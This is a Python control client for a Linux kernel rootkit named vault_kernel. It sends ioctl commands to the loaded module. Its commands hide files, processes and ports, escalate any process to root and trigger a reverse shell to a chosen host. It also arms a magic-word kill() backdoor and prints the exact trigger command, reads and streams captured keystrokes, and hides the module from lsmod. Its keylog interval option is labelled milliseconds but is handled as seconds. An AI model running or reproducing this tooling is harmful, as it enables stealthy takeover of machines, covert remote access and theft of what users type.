#!/usr/bin/env python3
"""
vault_kernel CLI — Userspace client for the vault_kernel kernel rootkit
ruby570bocadito © 2026

Usage:
    python3 vault_kernel_cli.py <command> [args...]

Commands:
    hide-file <name>      Hide a file/directory from ls, find, stat
    unhide-file <name>    Reveal a previously hidden file/directory
    hide-pid <pid>        Hide a process from ps, top, /proc
    unhide-pid <pid>      Reveal a hidden process
    hide-port <port>      Hide a TCP/UDP port from netstat, ss
    unhide-port <port>    Reveal a hidden port
    list                  List all hidden items (PIDs, files, ports)
    give-root [pid]       Escalate a process to root (default: self)
    shell <ip:port>       Trigger reverse shell to remote host
    magic <word>          Set magic packet trigger word
    keylog [--follow] [--interval MS]
                          Read captured keystrokes (stream with --follow)
    keylog-clear          Clear the keylogger buffer
    hide-module           Hide rootkit from lsmod
    unhide-module         Make rootkit visible in lsmod
    reset                 Clear ALL hidden files, PIDs and ports
    status                Check if rootkit is loaded and show info
    doctor                Diagnose module/client state (lab sanity check)
"""

import os
import sys
import stat as stat_mod
import struct
import time
import json
import fcntl
import errno
import argparse

MAGIC = 0xC0
DEVICE_PATH = "/dev/vault_kernel"
SYSFS_MODULE = "/sys/module/vault_kernel"
CLIENT_VERSION = "3.5"


def _port_arg(value):
    """argparse type: TCP/UDP port in the 1-65535 range."""
    try:
        iv = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError(f"invalid port: {value!r}")
    if not 1 <= iv <= 65535:
        raise argparse.ArgumentTypeError(
            f"port must be in 1-65535, got {iv}")
    return iv

# Standard Linux ioctl layout (uapi/asm-generic/ioctl.h):
#   bits 31:30 = direction  (0=none, 1=write, 2=read)
#   bits 29:16 = argument size
#   bits 15:8  = type (magic number)
#   bits 7:0   = command number

def _IOC(dir, type, nr, size):
    return (dir << 30) | (size << 16) | (type << 8) | nr

def _IO(type, nr):
    return _IOC(0, type, nr, 0)

def _IOW(type, nr, size):
    return _IOC(1, type, nr, size)

def _IOR(type, nr, size):
    return _IOC(2, type, nr, size)

IOCTL_GIVE_ROOT       = _IO(MAGIC, 0x01)
IOCTL_HIDE_FILE       = _IOW(MAGIC, 0x02, 256)
IOCTL_UNHIDE_FILE     = _IOW(MAGIC, 0x03, 256)
IOCTL_HIDE_PID        = _IOW(MAGIC, 0x04, 4)
IOCTL_UNHIDE_PID      = _IOW(MAGIC, 0x05, 4)
IOCTL_HIDE_PORT       = _IOW(MAGIC, 0x06, 2)
IOCTL_UNHIDE_PORT     = _IOW(MAGIC, 0x07, 2)
IOCTL_LIST_HIDDEN     = _IOR(MAGIC, 0x08, 4096)
IOCTL_KEYLOG_READ     = _IOR(MAGIC, 0x09, 4096)
IOCTL_KEYLOG_CLEAR    = _IO(MAGIC, 0x0A)
IOCTL_BACKDOOR_SHELL  = _IOW(MAGIC, 0x0B, 256)
IOCTL_BACKDOOR_MAGIC  = _IOW(MAGIC, 0x0C, 16)
IOCTL_MODULE_HIDE     = _IO(MAGIC, 0x0D)
IOCTL_MODULE_UNHIDE   = _IO(MAGIC, 0x0E)
IOCTL_GET_STATS       = _IOR(MAGIC, 0x0F, 4096)
IOCTL_RESET_ALL       = _IO(MAGIC, 0x10)

MAGIC_SIGNAL = 35  # glibc SIGRTMIN(34) + 1 — matches MAGIC_SIGNAL in src/backdoor.c


def fnv1a16(word: str) -> int:
    """FNV-1a 32-bit folded to 16 bits — mirrors vault_fnv1a16() in src/backdoor.c."""
    h = 0x811C9DC5
    for byte in word.encode():
        h ^= byte
        h = (h * 0x01000193) & 0xFFFFFFFF
    return ((h >> 16) ^ (h & 0xFFFF)) & 0xFFFF


def magic_pid(word: str, port: int) -> int:
    """Encode (port, word) into the fake PID for the kill() backdoor trigger."""
    return (port << 16) | fnv1a16(word)


def _proc_euid(pid):
    """Effective uid of pid read from /proc/<pid>/status, or None."""
    try:
        with open(f"/proc/{pid}/status") as fh:
            for line in fh:
                if line.startswith("Uid:"):
                    fields = line.split()
                    if len(fields) >= 3:
                        return int(fields[2])
    except (OSError, ValueError):
        pass
    return None


def _reject(condition, message):
    """Fail fast with a clear error instead of silently truncating
    the value inside the kernel's fixed-size buffers."""
    if condition:
        raise SystemExit(f"[-] {message}")


def run_doctor():
    """Lab sanity checks: device node, permissions, stats ABI, hook
    count, client/module version match, stealth state and every
    read-only control interface. Exits non-zero only when the module
    is unreachable; warnings do not fail."""
    print("[*] vault_kernel doctor — lab diagnostics")
    print()
    warnings = 0

    try:
        st = os.stat(DEVICE_PATH)
    except OSError:
        print(f"  [FAIL] {DEVICE_PATH} not found — module is not loaded")
        print("         Load it first: sudo insmod vault_kernel.ko")
        raise SystemExit(1)
    print(f"  [ OK ] device {DEVICE_PATH} present "
          f"(mode {stat_mod.filemode(st.st_mode)})")

    try:
        fd = os.open(DEVICE_PATH, os.O_RDWR)
    except OSError as e:
        print(f"  [FAIL] cannot open {DEVICE_PATH}: {e}")
        print("         EACCES/EPERM → run with sudo "
              "(module also rejects non-root since v3.4).")
        raise SystemExit(1)

    try:
        print("  [ OK ] device opens read/write")

        def raw(request, buf):
            try:
                fcntl.ioctl(fd, request, buf)
                return None
            except OSError as e:
                return e

        buf = bytearray(4096)
        e = raw(IOCTL_GET_STATS, buf)
        if e is not None:
            print(f"  [FAIL] GET_STATS failed: {e}")
            if e.errno == errno.ENOTTY:
                print("         ENOTTY → client and module versions are out of sync.")
            raise SystemExit(1)
        stats = {}
        for line in buf.rstrip(b'\x00').decode(errors='replace').splitlines():
            line = line.strip()
            if '=' in line:
                key, _, value = line.partition('=')
                stats[key] = value
        print("  [ OK ] GET_STATS responds")
        print(f"         module version : {stats.get('version')}")
        print(f"         uptime_s       : {stats.get('uptime_s')}")

        if stats.get('version') and stats['version'] != CLIENT_VERSION:
            print(f"  [WARN] client v{CLIENT_VERSION} != module v{stats['version']} "
                  "— ioctl ABI may differ")
            warnings += 1

        hooks = stats.get('hooks_installed')
        if hooks is not None:
            if hooks == '0':
                print("  [WARN] 0 syscall hooks installed — hiding features are inactive")
                warnings += 1
            else:
                print(f"  [ OK ] {hooks}/{stats.get('hooks_planned')} syscall hooks installed")

        if not os.path.isdir(SYSFS_MODULE):
            print("  [INFO] module not in /sys/module — hidden from lsmod/sysfs")
        else:
            print("  [INFO] module visible in /sys/module — not hidden")

        e = raw(IOCTL_KEYLOG_READ, bytearray(4096))
        if e is not None:
            print(f"  [WARN] KEYLOG_READ failed: {e}")
            warnings += 1
        else:
            print("  [ OK ] keylog interface responds")

        e = raw(IOCTL_LIST_HIDDEN, bytearray(4096))
        if e is not None:
            print(f"  [WARN] LIST_HIDDEN failed: {e}")
            warnings += 1
        else:
            print("  [ OK ] list interface responds")

        print()
        if warnings:
            print(f"[*] doctor finished with {warnings} warning(s)")
        else:
            print("[*] doctor finished: everything OK")
    finally:
        os.close(fd)


class VaultKernelClient:
    def __init__(self):
        self.fd = None

    def _open(self):
        if self.fd is not None:
            return
        if not os.path.exists(DEVICE_PATH):
            raise SystemExit(
                f"[-] {DEVICE_PATH} not found — is the module loaded?\n"
                "    Run: sudo insmod vault_kernel.ko")
        try:
            self.fd = os.open(DEVICE_PATH, os.O_RDWR)
        except PermissionError:
            raise SystemExit(
                f"[-] Permission denied on {DEVICE_PATH}. Run with sudo.")

    def _ioctl(self, request, buf=None):
        """Run an ioctl and report failures cleanly instead of
        crashing with a raw traceback (v3.2 only mapped EPERM)."""
        try:
            fcntl.ioctl(self.fd, request, buf)
            return True
        except OSError as e:
            print(f"[-] ioctl failed: {e}")
            if e.errno in (errno.EPERM, errno.EACCES):
                print("    Run with sudo.")
            elif e.errno == errno.ENOTTY:
                print("    Module and CLI version mismatch (ioctl number).")
            return False

    def _close(self):
        if self.fd is not None:
            os.close(self.fd)
            self.fd = None

    def give_root(self, pid=0):
        """Escalate a process to root. pid=0 means current process."""
        self._open()
        pid_buf = struct.pack("i", pid)
        if self._ioctl(IOCTL_GIVE_ROOT, pid_buf):
            if pid in (0, os.getpid()):
                # The module ran commit_creds() on our own task — verify it.
                if os.geteuid() == 0:
                    print(f"[+] Granted root to PID {pid if pid else os.getpid()} "
                          "(verified: euid=0)")
                else:
                    print("[?] ioctl succeeded but euid is unchanged — check dmesg")
            else:
                print(f"[+] Granted root to PID {pid}")
                euid = _proc_euid(pid)
                if euid == 0:
                    print(f"    Verified via /proc/{pid}/status: euid=0")
                else:
                    print(f"    (could not verify euid via /proc/{pid}/status)")
        self._close()

    def hide_file(self, name):
        _reject(not name, "file name cannot be empty")
        _reject(len(name.encode()) > 255,
                f"name too long ({len(name.encode())} bytes): "
                "the kernel hide-list stores at most 255")
        self._open()
        buf = name.encode().ljust(256, b'\x00')
        if self._ioctl(IOCTL_HIDE_FILE, buf):
            print(f"[+] Hiding file/dir: {name}")
        self._close()

    def unhide_file(self, name):
        _reject(not name, "file name cannot be empty")
        _reject(len(name.encode()) > 255,
                f"name too long ({len(name.encode())} bytes): "
                "the kernel hide-list stores at most 255")
        self._open()
        buf = name.encode().ljust(256, b'\x00')
        if self._ioctl(IOCTL_UNHIDE_FILE, buf):
            print(f"[-] Revealed: {name}")
        self._close()

    def hide_pid(self, pid):
        self._open()
        pid_buf = struct.pack("i", pid)
        if self._ioctl(IOCTL_HIDE_PID, pid_buf):
            print(f"[+] Hiding PID: {pid}")
        self._close()

    def unhide_pid(self, pid):
        self._open()
        pid_buf = struct.pack("i", pid)
        if self._ioctl(IOCTL_UNHIDE_PID, pid_buf):
            print(f"[-] Revealed PID: {pid}")
        self._close()

    def hide_port(self, port):
        self._open()
        port_buf = struct.pack("H", port)
        if self._ioctl(IOCTL_HIDE_PORT, port_buf):
            print(f"[+] Hiding port: {port}")
        self._close()

    def unhide_port(self, port):
        self._open()
        port_buf = struct.pack("H", port)
        if self._ioctl(IOCTL_UNHIDE_PORT, port_buf):
            print(f"[-] Revealed port: {port}")
        self._close()

    def list_hidden(self):
        self._open()
        buf = bytearray(4096)
        if self._ioctl(IOCTL_LIST_HIDDEN, buf):
            output = buf.rstrip(b'\x00').decode(errors='replace')
            print(output if output else "(nothing hidden)")
        self._close()

    def shell(self, target):
        """Trigger reverse shell to IP:PORT."""
        _reject(len(target.encode()) > 255,
                f"target too long ({len(target.encode())} bytes): "
                "kernel buffer stores at most 255")
        self._open()
        buf = target.encode().ljust(256, b'\x00')
        if self._ioctl(IOCTL_BACKDOOR_SHELL, buf):
            print(f"[+] Reverse shell triggered — connecting to {target}")
        self._close()

    def set_magic(self, word):
        """Set magic packet trigger word for kill() backdoor."""
        _reject(not word, "magic word cannot be empty")
        _reject(len(word.encode()) > 15,
                f"magic word too long ({len(word.encode())} chars): "
                "module stores at most 15")
        self._open()
        buf = word.encode().ljust(16, b'\x00')
        if self._ioctl(IOCTL_BACKDOOR_MAGIC, buf):
            print(f"[+] Magic packet backdoor enabled: '{word}'")
        self._close()

    def keylog_read(self, follow=False, interval=0.5):
        """Read captured keystrokes; with follow=True, stream new
        keystrokes until Ctrl-C.  The module's buffer shifts left when
        full, so a suffix diff is printed while the common prefix
        holds and a full replay when it wraps."""
        self._open()
        prev = ""
        try:
            while True:
                buf = bytearray(4096)
                if not self._ioctl(IOCTL_KEYLOG_READ, buf):
                    break
                cur = buf.rstrip(b'\x00').decode(errors='replace')
                if cur != prev:
                    if follow:
                        if len(cur) >= len(prev) and cur.startswith(prev):
                            print(cur[len(prev):], end='', flush=True)
                        else:
                            print("\n" + cur, end='', flush=True)
                        prev = cur
                    else:
                        print(f"[*] Keystroke log:\n{cur}" if cur
                              else "[*] (no keystrokes captured)")
                if not follow:
                    break
                time.sleep(interval)
        except KeyboardInterrupt:
            print("\n[*] Follow stopped")
        finally:
            self._close()

    def keylog_clear(self):
        """Clear keylogger buffer."""
        self._open()
        if self._ioctl(IOCTL_KEYLOG_CLEAR):
            print("[+] Keylogger buffer cleared")
        self._close()

    def hide_module(self):
        """Hide the rootkit from lsmod."""
        self._open()
        if self._ioctl(IOCTL_MODULE_HIDE):
            print("[+] Module hidden from lsmod")
        self._close()

    def unhide_module(self):
        """Make the rootkit visible in lsmod."""
        self._open()
        if self._ioctl(IOCTL_MODULE_UNHIDE):
            print("[-] Module visible again in lsmod")
        self._close()

    def reset(self):
        """Clear every hidden file, PID and port in one shot."""
        self._open()
        if self._ioctl(IOCTL_RESET_ALL):
            print("[+] Reset: all hidden files, PIDs and ports cleared")
        self._close()

    def status(self):
        """Check if rootkit is loaded."""
        if os.path.exists(DEVICE_PATH):
            print("[*] vault_kernel kernel module is LOADED")
            print(f"    Device: {DEVICE_PATH}")
            try:
                import subprocess
                result = subprocess.run(['modinfo', 'vault_kernel'],
                                        capture_output=True, text=True)
                if result.returncode == 0:
                    for line in result.stdout.splitlines():
                        if 'version' in line.lower() or 'author' in line.lower() or \
                           'description' in line.lower():
                            print(f"    {line.strip()}")
            except Exception:
                pass
        else:
            print("[*] vault_kernel kernel module is NOT loaded")
            print("    Run: sudo insmod vault_kernel.ko")

    def stats(self, as_json=False):
        """Read module statistics via IOCTL_GET_STATS; optionally
        re-emit as machine-readable JSON (numbers as numbers)."""
        self._open()
        buf = bytearray(4096)
        if self._ioctl(IOCTL_GET_STATS, buf):
            output = buf.rstrip(b'\x00').decode(errors='replace')
            if not output:
                print("(no stats returned)")
            elif as_json:
                raw = {}
                for line in output.splitlines():
                    line = line.strip()
                    if '=' in line:
                        key, _, value = line.partition('=')
                        raw[key] = value
                out = {}
                for key, value in raw.items():
                    try:
                        out[key] = int(value)
                    except ValueError:
                        out[key] = value
                print(json.dumps(out, indent=2, sort_keys=True))
            else:
                print(output)
        self._close()

    def magic_encode(self, word, port):
        """Print the ready-to-run kill() incantation for word+port."""
        encoded = magic_pid(word, port)
        print(f"[*] Magic word : {word} (hash 0x{fnv1a16(word):04X})")
        print(f"[*] Port       : {port}")
        print(f"[*] Encoded PID: {encoded}")
        print(f"[*] Trigger    : kill -s {MAGIC_SIGNAL} {encoded}")


def main():
    parser = argparse.ArgumentParser(
        description="vault_kernel CLI — kernel rootkit control",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    subparsers = parser.add_subparsers(dest="command", help="Available commands")

    subparsers.add_parser("status", help="Check if rootkit is loaded")
    subparsers.add_parser("doctor", help="Diagnose module/client state (lab sanity check)")

    sp = subparsers.add_parser("give-root", help="Escalate process to root")
    sp.add_argument("pid", nargs="?", type=int, default=0,
                    help="Target PID (default: self)")

    sp = subparsers.add_parser("hide-file", help="Hide a file/directory")
    sp.add_argument("name", help="File or directory name")

    sp = subparsers.add_parser("unhide-file", help="Reveal a hidden file/directory")
    sp.add_argument("name", help="File or directory name")

    sp = subparsers.add_parser("hide-pid", help="Hide a process")
    sp.add_argument("pid", type=int, help="Process ID")

    sp = subparsers.add_parser("unhide-pid", help="Reveal a hidden process")
    sp.add_argument("pid", type=int, help="Process ID")

    sp = subparsers.add_parser("hide-port", help="Hide a TCP/UDP port")
    sp.add_argument("port", type=_port_arg, help="Port number (1-65535)")

    sp = subparsers.add_parser("unhide-port", help="Reveal a hidden port")
    sp.add_argument("port", type=_port_arg, help="Port number (1-65535)")

    subparsers.add_parser("list", help="List all hidden items")
    sp = subparsers.add_parser("stats", help="Show module stats")
    sp.add_argument("--json", action="store_true", dest="as_json",
                    help="emit stats as machine-readable JSON")

    sp = subparsers.add_parser("shell", help="Trigger reverse shell")
    sp.add_argument("target", help="IP:PORT for reverse shell")

    sp = subparsers.add_parser("magic", help="Set magic packet trigger word")
    sp.add_argument("word", help="Trigger word")

    sp = subparsers.add_parser("magic-encode", help="Print the kill() trigger for word+port")
    sp.add_argument("word", help="Trigger word")
    sp.add_argument("port", type=_port_arg, help="Callback port (1-65535)")

    sp = subparsers.add_parser("keylog", help="Read captured keystrokes")
    sp.add_argument("--follow", action="store_true",
                    help="stream new keystrokes until Ctrl-C")
    sp.add_argument("--interval", type=float, default=0.5, metavar="MS",
                    help="poll interval in ms for --follow (default 500, min 50)")
    subparsers.add_parser("keylog-clear", help="Clear keylogger buffer")
    subparsers.add_parser("hide-module", help="Hide from lsmod")
    subparsers.add_parser("unhide-module", help="Reveal in lsmod")
    subparsers.add_parser("reset", help="Clear ALL hidden files, PIDs and ports")

    args = parser.parse_args()

    if args.command is None:
        parser.print_help()
        sys.exit(1)

    if os.geteuid() != 0:
        print("[!] Warning: not running as root. Some commands may fail.")

    client = VaultKernelClient()

    try:
        if args.command == "status":
            client.status()
        elif args.command == "doctor":
            run_doctor()
        elif args.command == "give-root":
            client.give_root(args.pid)
        elif args.command == "hide-file":
            client.hide_file(args.name)
        elif args.command == "unhide-file":
            client.unhide_file(args.name)
        elif args.command == "hide-pid":
            client.hide_pid(args.pid)
        elif args.command == "unhide-pid":
            client.unhide_pid(args.pid)
        elif args.command == "hide-port":
            client.hide_port(args.port)
        elif args.command == "unhide-port":
            client.unhide_port(args.port)
        elif args.command == "list":
            client.list_hidden()
        elif args.command == "stats":
            client.stats(as_json=args.as_json)
        elif args.command == "shell":
            client.shell(args.target)
        elif args.command == "magic":
            client.set_magic(args.word)
        elif args.command == "magic-encode":
            client.magic_encode(args.word, args.port)
        elif args.command == "keylog":
            interval = max(args.interval, 0.05)
            client.keylog_read(follow=args.follow, interval=interval)
        elif args.command == "keylog-clear":
            client.keylog_clear()
        elif args.command == "hide-module":
            client.hide_module()
        elif args.command == "unhide-module":
            client.unhide_module()
        elif args.command == "reset":
            client.reset()
    except Exception as e:
        print(f"[-] Error: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
